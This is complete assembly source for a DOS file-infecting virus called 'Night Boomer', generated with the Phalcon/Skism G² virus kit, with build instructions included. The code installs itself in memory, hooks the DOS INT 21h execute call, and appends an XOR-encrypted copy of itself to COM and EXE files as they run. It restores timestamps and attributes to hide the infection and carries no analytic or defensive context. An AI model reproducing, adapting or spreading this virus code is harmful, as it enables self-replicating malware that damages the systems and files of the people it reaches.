; Virus generated by G� 0.70�
; G� written by Dark Angel of Phalcon/Skism
                
; File: BOMB.ASM
;     Night Boomer by (c) TNT 
                
checkres1       =       'DA'
checkres2       =       'PS'
id              =       'NB'
                
        .model  tiny
        .code   
                
; Assemble with:
; TASM /m3 filename.ASM
; TLINK filename.OBJ
; EXE2BIN filename.EXE filename.COM
        org     0000h
                
start:
ENCRYPT:
patchstart:
        mov     bx, offset endencrypt
        mov     cx, (heap-endencrypt)/2+1
encrypt_loop:
        db      002Eh                   ; cs:
        db      0081h,0037h             ; xor word ptr [bx], xxxx
encryptvalue    dw      0000h
        add     bx, 0002h
        loop    encrypt_loop
endencrypt:
        mov     bp, sp
        int     0003h
next:
        mov     bp, ss:[bp-6]
        sub     bp, offset next
                
        push    ds
        push    es
                
        mov     ax, checkres1           ; Installation check
        int     0021h
        cmp     ax, checkres2           ; Already installed?
        jz      done_install
                
        mov     ah, 004Ah               ; alter memory allocation
        mov     bx, 0FFFFh              ; of segment at ES
        int     0021h
                
        sub     bx, (endheap-start+15)/16+1
        mov     ah, 004Ah               ; alter memory allocation
        int     0021h
        jc      done_install
        sub     word ptr ds:[0002h], (endheap-start+15)/16+1
                
        mov     ah, 0048h               ; Allocate memory for the virus
        mov     bx, (endheap-start+15)/16
        int     0021h
        jc      done_install
                
        mov     es, ax
        dec     ax
        mov     ds, ax                  ; Get MCB
                
        mov     byte ptr ds:[0000h], 'Z' ; Mark end of chain
        mov     word ptr ds:[0001h], 0008h ; Mark owner = DOS
                
        push    cs
        pop     ds
        xor     di, di
        mov     cx, (heap-start)/2+1    ; Bytes to move
        mov     si, bp                  ; lea  si,[bp+offset start]
        rep     movsw   
                
        xor     ax, ax
        mov     ds, ax
        push    ds
        lds     ax, ds:[21h*4]          ; Get old int handler
        mov     word ptr es:oldint21, ax
        mov     word ptr es:oldint21+2, ds
        pop     ds
        mov     word ptr ds:[21h*4], offset int21 ; Replace with new handler
        mov     ds:[21h*4+2], es        ; in high memory
                
done_install:
        pop     es
        pop     ds
        cmp     sp, id
        jne     restore_COM
restore_EXE:
        mov     ax, ds
        add     ax, 0010h
        add     cs:[bp+word ptr origCSIP+2], ax
        add     ax, cs:[bp+word ptr origSPSS]
        cli     
        mov     ss, ax
        mov     sp, cs:[bp+word ptr origSPSS+2]
        sti     
        db      00EAh
origCSIP        db      ?
old3            db      0cdh,20h,0
origSPSS        dd      ?
                
restore_COM:
        mov     di, 0100h
        push    di
        lea     si, [bp+offset old3]
        movsw   
        movsb   
        ret     
                
INT24:
        mov     al, 0003h
        iret    
                
int21:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es
                
        cmp     ax, 4B00h               ; execute?
        jz      execute
return:
        jmp     exitint21
execute:
        mov     word ptr cs:filename, dx
        mov     word ptr cs:filename+2, ds
        mov     ax, 3524h
        int     0021h
        push    es
        push    bx
                
        lea     dx, INT24               ; ASSumes ds=cs
        mov     ax, 2524h
        int     0021h
                
        push    cs
        pop     es
                
                
        mov     bx, dx
        cmp     word ptr [bx+3], 'AM'   ; Check if COMMAND.COM
        jz      return                  ; Exit if so
                
        mov     ax, 4300h
        lds     dx, cs:filename
        int     0021h
        jc      return
        push    cx
        push    ds
        push    dx
                
        mov     ax, 4301h               ; clear file attributes
        push    ax                      ; save for later use
        xor     cx, cx
        int     0021h
                
        lds     dx, cs:filename
        mov     ax, 3D02h
        int     0021h
        xchg    ax, bx
                
        push    cs
        pop     ds
                
        mov     ax, 5700h               ; get file time/date
        int     0021h
        push    cx
        push    dx
                
        mov     cx, 001Ah
        mov     dx, offset readbuffer
        mov     ah, 003Fh
        int     0021h
                
        xor     cx, cx
        mov     ax, 4202h
        xor     dx, dx
        int     0021h
                
        cmp     word ptr [offset readbuffer], 'ZM'
        jz      checkEXE
                
        mov     cx, word ptr [offset readbuffer+1] ; jmp location
        add     cx, heap-start+3        ; convert to filesize
        cmp     ax, cx                  ; equal if already infected
        jz      jmp_close
                
        cmp     ax, 65535-(endheap-start) ; check if too large
        ja      jmp_close               ; Exit if so
                
        mov     si, offset readbuffer
        mov     di, offset old3
        movsw   
        movsb   
                
        mov     si, ax                  ; save entry point
        add     si, 0100h
        mov     cx, 0003h
        sub     ax, cx
        mov     word ptr [offset readbuffer+1], ax
        mov     dl, 00E9h
        mov     byte ptr [offset readbuffer], dl
        jmp     short continue_infect
checkEXE:
        cmp     word ptr [offset readbuffer+10h], id
        jnz     skipp
jmp_close:
        jmp     close
skipp:
                
        lea     di, origCSIP
        lea     si, readbuffer+14h
        movsw                           ; Save original CS and IP
        movsw   
                
        sub     si, 000Ah
        movsw                           ; Save original SS and SP
        movsw   
                
        push    bx                      ; save file handle
        mov     bx, word ptr [readbuffer+8] ; Header size in paragraphs
        mov     cl, 0004h
        shl     bx, cl
                
        push    dx                      ; Save file size on the
        push    ax                      ; stack
                
        sub     ax, bx                  ; File size - Header size
        sbb     dx, 0000h               ; DX:AX - BX -> DX:AX
                
        mov     cx, 0010h
        div     cx                      ; DX:AX/CX = AX Remainder DX
                
        mov     word ptr [readbuffer+0Eh], ax ; Para disp stack segment
        mov     word ptr [readbuffer+14h], dx ; IP Offset
        mov     word ptr [readbuffer+16h], ax ; Para disp CS in module.
        mov     word ptr [readbuffer+10h], id ; Initial SP
                
        mov     si, dx                  ; save entry point
        pop     ax                      ; Filelength in DX:AX
        pop     dx
                
        add     ax, heap-start
        adc     dx, 0000h
                
        mov     cl, 0009h
        push    ax
        shr     ax, cl
        ror     dx, cl
        stc     
        adc     dx, ax
        pop     ax
        and     ah, 0001h
                
        mov     word ptr [readbuffer+4], dx ; Fix-up the file size in
        mov     word ptr [readbuffer+2], ax ; the EXE header.
                
        pop     bx                      ; restore file handle
        mov     cx, 001Ah
                
continue_infect:
        push    cx                      ; save # bytes to write
                
        mov     ah, 002Ch               ; Get current time
        int     0021h
                
        add     si, (offset endencrypt-offset encrypt)
        mov     word ptr ds:[patchstart+1], si
        mov     word ptr ds:[encryptvalue], dx
                
        mov     di, offset encryptbuffer
        mov     si, offset ENCRYPT
        mov     cx, (heap-encrypt)/2
        push    si
        rep     movsw                   ; copy virus to buffer
                
        mov     ax, offset endencrypt-encrypt+encryptbuffer
        mov     word ptr ds:[patchstart+1], ax
        pop     si
        push    offset endencrypt
        mov     byte ptr [offset endencrypt], 00C3h ; retn
        push    bx
        call    si                      ; encrypt virus in buffer
        pop     bx
        pop     word ptr [offset endencrypt]
                
                
        mov     ah, 0040h
        mov     cx, heap-encrypt
        mov     dx, offset encryptbuffer
        int     0021h
                
        mov     ax, 4200h
        xor     cx, cx
        xor     dx, dx
        int     0021h
                
                
        mov     dx, offset readbuffer
        mov     ah, 0040h
        pop     cx
        int     0021h
                
                
close:
        mov     ax, 5701h               ; restore file time/date
        pop     dx
        pop     cx
        int     0021h
                
        mov     ah, 003Eh
        int     0021h
                
        pop     ax                      ; restore file attributes
        pop     dx                      ; get filename and
        pop     ds
        pop     cx                      ; attributes from stack
        int     0021h
                
        pop     dx
        pop     ds
        mov     ax, 2524h
        int     0021h
                
exitint21:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
                
        db      00EAh                   ; return to original handler
oldint21        dd      ?
                
signature       db      '[PS/G�]',0     ; Phalcon/Skism G�
creator         db      '(c) TNT ',0
virusname       db      'Night Boomer',0
                
heap:
encryptbuffer   db      (heap-encrypt)+1 dup (?)
filename        dd      ?
readbuffer      db      1ah dup (?)
endheap:
        end     start